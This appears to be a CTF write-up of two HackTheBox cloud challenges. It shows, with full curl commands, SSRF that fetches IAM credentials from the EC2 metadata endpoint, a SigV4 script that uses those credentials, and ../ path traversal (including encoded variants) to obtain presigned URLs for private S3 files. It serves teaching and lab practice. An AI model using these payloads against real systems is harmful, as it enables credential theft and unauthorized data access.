---
icon: cloud-binary
---

# CLOUD

#### Cloud Security Challenges **Category:** Cloud Security / AWS **Challenges Covered:** Dashboarded (Very Easy) | Volnaya Vault (Easy)

***

> #### Both of these challenges are about the same underlying problem: developers building on cloud infrastructure who don't understand that "the server will fetch this for me" and "the server will sign this for me" are dangerous trust relationships when user input is involved. One challenge exploits SSRF to steal AWS credentials from the metadata service. The other exploits path traversal to abuse a presigned URL generator. Different entry points, same lesson — never let user input near anything that touches AWS internals without bulletproof validation.

***

### Dashboarded

**Difficulty:** Very Easy\
**Flag:** `HTB{d4sh1nG_tHr0ugH_DaSHbO4rDs}`

***

### Recon

```
┌──(sn0x㉿sn0x)-[~/HTB/Dashboarded]
└─$ rustscan -a 10.113.221.81 --ulimit 5000 -- -sV -sC
```

```
Open 10.113.221.81:80/tcp
PORT   STATE SERVICE VERSION
80/tcp open  http
```

Landing on the app you get an "Empire of Volnaya | ICS Dashboard" some kind of industrial control panel showing power plants, water treatment facilities, the works. Looks intimidating but the real signal is buried in the operation logs on the page itself. One of the log entries reads: `SSRF exploit success`. That's not an accident  the challenge is literally telling you the vulnerability class upfront.

```
┌──(sn0x㉿sn0x)-[~/HTB/Dashboarded]
└─$ curl -s "http://10.113.221.81" | grep -i "url\|form\|input"
```

```html
<form method="post">
  <input type="hidden" name="url" value="https://inyunqef0e.execute-api.us-east-2.amazonaws.com/api/status">
</form>
```

There it is. A hidden `url` parameter inside a POST form. The server takes that URL and fetches content from it  that's the mechanism. And since it's a hidden field, the developer probably assumed users would never touch it. Bad assumption.

***

### Mapping the API

Before going straight for the SSRF, let's see what the legitimate API looks like:

```
┌──(sn0x㉿sn0x)-[~/HTB/Dashboarded]
└─$ curl -s "https://inyunqef0e.execute-api.us-east-2.amazonaws.com/api/"
```

```json
{"endpoints": ["/status", "/private"]}
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Dashboarded]
└─$ curl -s "https://inyunqef0e.execute-api.us-east-2.amazonaws.com/api/status"
```

```json
[
  {"name": "Power Plant Zeta-7", "status": "critical", "message": "Power Grid Disruption"},
  {"name": "Water Treatment Facility Delta-9", "status": "operational", "message": "All checks OK"},
  {"name": "Factory Alpha-12", "status": "warning", "message": "Minor Systems Failure"}
]
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Dashboarded]
└─$ curl -s "https://inyunqef0e.execute-api.us-east-2.amazonaws.com/api/private"
```

```json
{"message":"Missing Authentication Token"}
```

So `/status` is public, `/private` requires AWS authentication. That's the target. Now we need credentials  and we're going to get them from the EC2 metadata service.

***

### SSRF Confirmation

Let's verify the server actually fetches whatever URL we give it:

```
┌──(sn0x㉿sn0x)-[~/HTB/Dashboarded]
└─$ curl -X POST -d "url=https://inyunqef0e.execute-api.us-east-2.amazonaws.com/api/private" \
  "http://10.113.221.81"
```

Response contains: `Invalid JSON data:` followed by the raw authentication error. The server fetched the private endpoint, got back the auth error JSON, tried to parse it as dashboard data, and failed. That `Invalid JSON data:` prefix leaking is actually useful  it means the response body is being reflected back even when it's not valid dashboard JSON, which gives us an out-of-band read channel.

SSRF is confirmed. The server fetches arbitrary URLs we supply.

***

### AWS Instance Metadata - What This Is and Why It Matters

Before the actual exploit, a quick explanation of what we're about to hit because it's important to understand why this is such a big deal.

Every EC2 instance in AWS has access to a special internal endpoint: `http://169.254.169.254`. This is the **Instance Metadata Service (IMDS)**. It's not on the internet it only exists on a link-local address that only the EC2 instance itself can reach. Or at least, only the instance _should_ be able to reach it. The metadata service returns information about the running instance: its hostname, instance ID, region, and critically  **temporary AWS credentials for any IAM roles attached to the instance**.

If your web app has SSRF and it's running on EC2, every attacker in the world now has potential access to that metadata endpoint, because the server will fetch it _on their behalf_. That's what we're exploiting.

```
┌──(sn0x㉿sn0x)-[~/HTB/Dashboarded]
└─$ curl -X POST -d "url=http://169.254.169.254/latest/meta-data/" \
  "http://10.113.221.81"
```

```
Invalid JSON data: ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hostname
iam/
identity-credentials/
instance-action
instance-id
[...snip...]
```

The `iam/` entry is what we want. That means IAM roles are attached to this instance, which means there are temporary credentials waiting to be stolen.

***

### Stealing IAM Credentials

```
┌──(sn0x㉿sn0x)-[~/HTB/Dashboarded]
└─$ curl -X POST -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  "http://10.113.221.81"
```

```
Invalid JSON data: APICallerRole
```

One role: `APICallerRole`. The name already tells us what it can do  it's the role the application uses to call the API. Which means it has permission to call `/api/private`.

```
┌──(sn0x㉿sn0x)-[~/HTB/Dashboarded]
└─$ curl -X POST \
  -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/APICallerRole" \
  "http://10.113.221.81"
```

```
Invalid JSON data: 
AccessKeyId: ASIARHJJMXKMXO77HYYK
SecretAccessKey: gl0jeG+GWR/00dgczsXpMoKzs4bqSn/h66t3GDWT
Token: IQoJb3JpZ2luX2VjEH4aCXVzLWVhc3Q....[snip]....
Expiration: 2025-xx-xxTxx:xx:xxZ
```

We now have a full set of temporary AWS credentials  Access Key, Secret Key, and Session Token. These are the same credentials the EC2 instance uses to make signed AWS API calls. The token has an expiry so you need to move quickly.

***

### Calling the Private API with AWS Signature V4

AWS API Gateway uses **Signature Version 4** authentication. This is AWS's signing protocol where you construct a canonical representation of your HTTP request, hash it, sign it with your secret key through a chain of HMAC-SHA256 operations, and attach the resulting signature in an `Authorization` header. The process exists so AWS can verify that requests come from someone who legitimately holds those credentials.

It's not complicated  it's just tedious. Here's the full script:

```
┌──(sn0x㉿sn0x)-[~/HTB/Dashboarded]
└─$ cat aws_sign.py
```

```python
#!/usr/bin/env python3
import hashlib, hmac, requests
from datetime import datetime

def sign(key, msg):
    return hmac.new(key, msg.encode('utf-8'), hashlib.sha256).digest()

def get_signing_key(secret, date, region, service):
    k_date    = sign(('AWS4' + secret).encode('utf-8'), date)
    k_region  = sign(k_date, region)
    k_service = sign(k_region, service)
    return sign(k_service, 'aws4_request')

# Credentials stolen from IMDS via SSRF
ACCESS_KEY    = 'ASIARHJJMXKMXO77HYYK'
SECRET_KEY    = 'gl0jeG+GWR/00dgczsXpMoKzs4bqSn/h66t3GDWT'
SESSION_TOKEN = 'IQoJb3JpZ2luX2VjEH4aCXVzLWVhc3Q[...snip...]'

HOST     = 'inyunqef0e.execute-api.us-east-2.amazonaws.com'
REGION   = 'us-east-2'
SERVICE  = 'execute-api'
ENDPOINT = f'https://{HOST}/api/private'
URI      = '/api/private'

t         = datetime.utcnow()
amzdate   = t.strftime('%Y%m%dT%H%M%SZ')
datestamp = t.strftime('%Y%m%d')

# Build canonical request — every field has to be exact or signature fails
canonical_headers = (
    f'host:{HOST}\n'
    f'x-amz-date:{amzdate}\n'
    f'x-amz-security-token:{SESSION_TOKEN}\n'
)
signed_headers  = 'host;x-amz-date;x-amz-security-token'
payload_hash    = hashlib.sha256(b'').hexdigest()
canonical_req   = f'GET\n{URI}\n\n{canonical_headers}\n{signed_headers}\n{payload_hash}'

# String to sign
cred_scope   = f'{datestamp}/{REGION}/{SERVICE}/aws4_request'
string_to_sign = (
    f'AWS4-HMAC-SHA256\n{amzdate}\n{cred_scope}\n'
    + hashlib.sha256(canonical_req.encode()).hexdigest()
)

# Generate signature
signing_key = get_signing_key(SECRET_KEY, datestamp, REGION, SERVICE)
signature   = hmac.new(signing_key, string_to_sign.encode(), hashlib.sha256).hexdigest()

auth_header = (
    f'AWS4-HMAC-SHA256 Credential={ACCESS_KEY}/{cred_scope}, '
    f'SignedHeaders={signed_headers}, Signature={signature}'
)

headers = {
    'x-amz-date': amzdate,
    'x-amz-security-token': SESSION_TOKEN,
    'Authorization': auth_header
}

resp = requests.get(ENDPOINT, headers=headers)
print(f"Status: {resp.status_code}")
print(resp.text)
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Dashboarded]
└─$ python3 aws_sign.py
```

```
Status: 200
{"flag": "HTB{d4sh1nG_tHr0ugH_DaSHbO4rDs}", "data": [...infrastructure data...]}
```

***

### Why the Sig V4 Process Works the Way It Does

The signing chain is: `HMAC(HMAC(HMAC(HMAC("AWS4"+secret, date), region), service), "aws4_request")`. Each HMAC wraps the previous one. This creates a key that's scoped to a specific date, region, and service so even if someone intercepts a signed request, the signature is only valid for that exact endpoint on that exact day. It's genuinely good crypto. The problem here isn't the signing algorithm, it's that the credentials themselves were leaked via SSRF before any signing even happened.

***

#### Attack Chain

```
Hidden <url> parameter in form
        ↓
SSRF — server fetches arbitrary URLs on our behalf
        ↓
Target: http://169.254.169.254/latest/meta-data/
        ↓
Enumerate IAM roles → find "APICallerRole"
        ↓
Steal temporary credentials (AccessKey + SecretKey + Token)
        ↓
Construct AWS Sig V4 signed request
        ↓
GET /api/private with valid Authorization header
        ↓
FLAG
```

***

## Volnaya Vault

**Difficulty:** Easy\
**Flag:** `HTB{Tr4v3rsing_buck3ts_4fun}`

***

### Recon

```
┌──(sn0x㉿sn0x)-[~/HTB/VolnayaVault]
└─$ rustscan -a 10.113.221.81 --ulimit 5000 -- -sV -sC
```

```
80/tcp open http (S3 static website redirect)
```

The app is a React SPA called "Volnaya Vault" a document management system. Visiting the root hits an S3 static website hosting endpoint:

```
┌──(sn0x㉿sn0x)-[~/HTB/VolnayaVault]
└─$ curl -s "http://volnaya-vault-static-website.s3-website.eu-north-1.amazonaws.com/"
```

It's a React app, so all the actual logic is in the compiled JavaScript bundle. That's where we look next.

***

### JavaScript Bundle Analysis

React apps bundle everything into a minified JS file. Even though it's minified (all the whitespace and variable names stripped out), hardcoded strings like API endpoints survive the minification process unchanged. That's what we're hunting for.

```
┌──(sn0x㉿sn0x)-[~/HTB/VolnayaVault]
└─$ curl -s "http://volnaya-vault-static-website.s3-website.eu-north-1.amazonaws.com/assets/index-3xJTFlOo.js" \
  -o bundle.js

grep -o 'http://volnaya-vault[^"]*' bundle.js
```

```
http://volnaya-vault-lb-69672775.eu-north-1.elb.amazonaws.com/api/files
http://volnaya-vault-lb-69672775.eu-north-1.elb.amazonaws.com/api/download
```

Two endpoints: `GET /api/files` lists documents, `POST /api/download` generates a presigned S3 URL to download a specific file. The load balancer URL tells us there's a backend server sitting in front of the S3 bucket.

***

### S3 Bucket Enumeration

While we're at it, let's poke the bucket directly:

```
┌──(sn0x㉿sn0x)-[~/HTB/VolnayaVault]
└─$ curl -s "https://volnaya-vault.s3.eu-north-1.amazonaws.com/"
```

```xml
<ListBucketResult>
  ...
  <Contents><Key>vault/public/Canteen_Water_Safety_Bulletin_2024_Q1.txt</Key></Contents>
  <Contents><Key>vault/public/propaganda.png</Key></Contents>
  <Contents><Key>vault/private/DIRECTORATE ALPHA &amp; BETA FIELD OPERATIVES.docx</Key></Contents>
  <Contents><Key>vault/private/_Post-Assessment Report.pdf</Key></Contents>
  ...
</ListBucketResult>
```

The bucket listing is public (another misconfiguration but a minor one here). More importantly  we can see the directory structure. There's a `vault/public/` for accessible files and a `vault/private/` for the sensitive ones. Trying to access `vault/private/` directly returns 403. The API is supposed to be the gatekeeper.

***

### API Behavior Analysis

```
┌──(sn0x㉿sn0x)-[~/HTB/VolnayaVault]
└─$ curl -s "http://volnaya-vault-lb-69672775.eu-north-1.elb.amazonaws.com/api/files"
```

```json
[
  {"classification":"PUBLIC","id":"VOL-2025-1A93E507","name":"Canteen_Water_Safety_Bulletin_2024_Q1.txt"},
  {"classification":"PUBLIC","id":"VOL-2025-D5E31294","name":"PR_Volnaya_Cyber_Forces_Image_Pack_Approved.zip"},
  {"classification":"PUBLIC","id":"VOL-2025-318F44EA","name":"Vehicle_Log_Update_VZ-TRK-1138.txt"},
  {"classification":"PUBLIC","id":"VOL-2025-64AACBC1","name":"propaganda.png"}
]
```

Only public files. The private ones don't appear in the listing. Now let's see what the download endpoint does:

```
┌──(sn0x㉿sn0x)-[~/HTB/VolnayaVault]
└─$ curl -s -X POST \
  "http://volnaya-vault-lb-69672775.eu-north-1.elb.amazonaws.com/api/download" \
  -H "Content-Type: application/json" \
  -d '{"filename":"propaganda.png"}'
```

```json
{
  "url": "https://volnaya-vault.s3.eu-north-1.amazonaws.com/vault/public/propaganda.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=...&X-Amz-Signature=..."
}
```

So the backend takes the filename, prepends `vault/public/` to it, and generates a presigned S3 URL for that constructed path. The presigned URL is valid for some time window and lets anyone download that specific S3 object without needing their own AWS credentials.

Now what happens if we send the private file's name?

```
┌──(sn0x㉿sn0x)-[~/HTB/VolnayaVault]
└─$ curl -s -X POST \
  "http://volnaya-vault-lb-69672775.eu-north-1.elb.amazonaws.com/api/download" \
  -H "Content-Type: application/json" \
  -d '{"filename":"DIRECTORATE ALPHA & BETA FIELD OPERATIVES.docx"}'
```

```json
{
  "url": "https://volnaya-vault.s3.eu-north-1.amazonaws.com/vault/public/DIRECTORATE%20ALPHA%20%26%20BETA%20FIELD%20OPERATIVES.docx?..."
}
```

It generates a URL but pointing to `vault/public/DIRECTORATE...` which doesn't exist. The file is in `vault/private/`, not `vault/public/`. Fetching that URL gives a 404.

The backend is blindly constructing the path as `"vault/public/" + filename` with no normalization. That's the hole.

***

### Path Traversal - How `../` Breaks the Path Construction

Path traversal is one of those vulnerabilities that feels almost too simple once you see it. The backend code is probably doing something like:

```python
s3_key = "vault/public/" + filename
# Then: generate_presigned_url(bucket, s3_key)
```

When `filename` is `propaganda.png`, `s3_key` resolves to `vault/public/propaganda.png`. Fine.

When `filename` is `../private/secret.docx`, `s3_key` resolves to `vault/public/../private/secret.docx`. And when S3 (or the underlying path resolver) normalizes that, `..` means "go up one directory"  so it collapses to `vault/private/secret.docx`. We've escaped the `public/` directory without any authentication check.

```
┌──(sn0x㉿sn0x)-[~/HTB/VolnayaVault]
└─$ curl -s -X POST \
  "http://volnaya-vault-lb-69672775.eu-north-1.elb.amazonaws.com/api/download" \
  -H "Content-Type: application/json" \
  -d '{"filename":"../private/DIRECTORATE ALPHA & BETA FIELD OPERATIVES.docx"}'
```

```json
{
  "url": "https://volnaya-vault.s3.eu-north-1.amazonaws.com/vault/private/DIRECTORATE%20ALPHA%20%26%20BETA%20FIELD%20OPERATIVES.docx?X-Amz-Algorithm=AWS4-HMAC-SHA256&..."
}
```

The generated URL now points to `vault/private/`. The backend signed a presigned URL for a private file using its own IAM credentials, because it never checked that the resolved path was still inside the intended `vault/public/` directory.

***

#### Downloading and Extracting the Flag

```
┌──(sn0x㉿sn0x)-[~/HTB/VolnayaVault]
└─$ curl -s "<presigned_url_from_above>" \
  -o OPERATIVES.docx

file OPERATIVES.docx
```

```
OPERATIVES.docx: Microsoft Word 2007+ (ZIP)
```

```
┌──(sn0x㉿sn0x)-[~/HTB/VolnayaVault]
└─$ strings OPERATIVES.docx | grep HTB
```

```
HTB{Tr4v3rsing_buck3ts_4fun}
```

While we're here, grab the second private file too  just to confirm the traversal works on multiple targets:

```
┌──(sn0x㉿sn0x)-[~/HTB/VolnayaVault]
└─$ curl -s -X POST \
  "http://volnaya-vault-lb-69672775.eu-north-1.elb.amazonaws.com/api/download" \
  -H "Content-Type: application/json" \
  -d '{"filename":"../private/_Post-Assessment Report.pdf"}'
```

Works the same way. Same traversal, different file.

***

### What Presigned URLs Are and Why This Matters

A presigned URL is a temporary, pre-authenticated S3 URL that lets anyone with the link download a specific object  no AWS credentials required from the downloader. The server generates it using its own IAM credentials, which have full access to the bucket. The URL includes a signature that encodes: who signed it, what object, what bucket, what expiry time.

The design intent is: server authenticates the _user's authorization_ first, then generates a presigned URL for _only the files they're allowed to access_. The vulnerability here is that the server skipped the authorization check entirely  it just takes your filename, sticks a path in front of it, and signs whatever path you gave it. By inserting `../`, you make it sign a path to a file it was never supposed to give you access to.

***

### Alternate Approaches Worth Knowing

**Direct bucket access attempt**  we could try accessing `vault/private/` objects directly with `--no-sign-request` in case the bucket ACLs were misconfigured:

```
┌──(sn0x㉿sn0x)-[~/HTB/VolnayaVault]
└─$ aws s3 cp s3://volnaya-vault/vault/private/ . --recursive --no-sign-request
```

This would fail here (private prefix is properly locked), but always worth checking first since it's the fastest path.

**URL-encoded traversal**  some backends decode URLs before path construction but check for `../` before decoding. In that case: `..%2fprivate%2ffile.docx` or `%2e%2e/private/file.docx` would bypass the literal string check. Try these if the plain `../` doesn't work.

**Double-encoded**  `..%252fprivate%252f` if there's a double-decode somewhere.

***

#### Attack Chain

```
S3 static site → React app
        ↓
Download JS bundle → grep for API endpoints
        ↓
S3 bucket listing → discover vault/public/ and vault/private/
        ↓
POST /api/download with normal filename → understand path construction
        ↓
POST /api/download with "../private/<file>" → path traversal
        ↓
Backend constructs: "vault/public/" + "../private/<file>"
        ↓
Resolves to: "vault/private/<file>"
        ↓
Backend signs presigned URL for private file using own IAM credentials
        ↓
Download file → extract flag
        ↓
FLAG
```

***

### Combined Techniques I Used

| Technique                              | Where Used                                                 |
| -------------------------------------- | ---------------------------------------------------------- |
| Server-Side Request Forgery (SSRF)     | Dashboarded — fetching arbitrary internal URLs             |
| AWS IMDS (169.254.169.254) enumeration | Dashboarded — discovering IAM role and credentials         |
| Temporary IAM credential theft         | Dashboarded — stealing AccessKey + SecretKey + Token       |
| AWS Signature Version 4 construction   | Dashboarded — authenticating to private API endpoint       |
| React JS bundle static analysis        | Volnaya Vault — extracting backend API endpoints           |
| S3 bucket listing enumeration          | Volnaya Vault — mapping public/private directory structure |
| Path traversal via `../` sequences     | Volnaya Vault — escaping `vault/public/` prefix            |
| S3 presigned URL abuse                 | Volnaya Vault — server signs URLs for unauthorized paths   |
| URL-encoded traversal variants         | Volnaya Vault — alternate bypass if literal check exists   |
| rustscan port enumeration              | Both challenges                                            |
| curl API testing                       | Both challenges                                            |

***
